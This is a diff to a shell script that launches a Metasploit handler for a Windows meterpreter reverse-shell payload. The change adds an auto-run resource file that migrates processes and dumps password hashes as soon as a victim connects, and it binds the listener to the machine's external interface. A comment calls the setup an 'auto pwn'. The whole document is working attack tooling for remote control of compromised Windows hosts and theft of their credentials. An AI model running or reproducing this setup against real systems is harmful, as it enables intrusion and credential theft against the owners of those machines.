@@ -14,13 +14,18 @@ while [ ! -f .attack ];do
 done
 
 tput cnorm
+# Create /root/autoruncommands.rc with the specified commands to auto pwn!
+cat <<EOL > /root/autoruncommands.rc
+run post/windows/manage/migrate
+run post/windows/gather/hashdump
+EOL
 
-# Start the Metasploit framework console with a handler
+# Run Metasploit with the desired settings
 msfconsole -q -x "use exploit/multi/handler; \
                   set PAYLOAD windows/meterpreter/reverse_tcp; \
-                  set LHOST 127.0.0.1; \
+                  set LHOST $(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'); \
                   set LPORT 5040; \
                   set ExitOnSession false; \
-		  set AutoRunScript /post/windows/manage/migrate; \
-    		  set VERBOSE true; \
+                  set AutoRunScript /root/autoruncommands.rc; \
+                  set VERBOSE true; \
                   exploit"
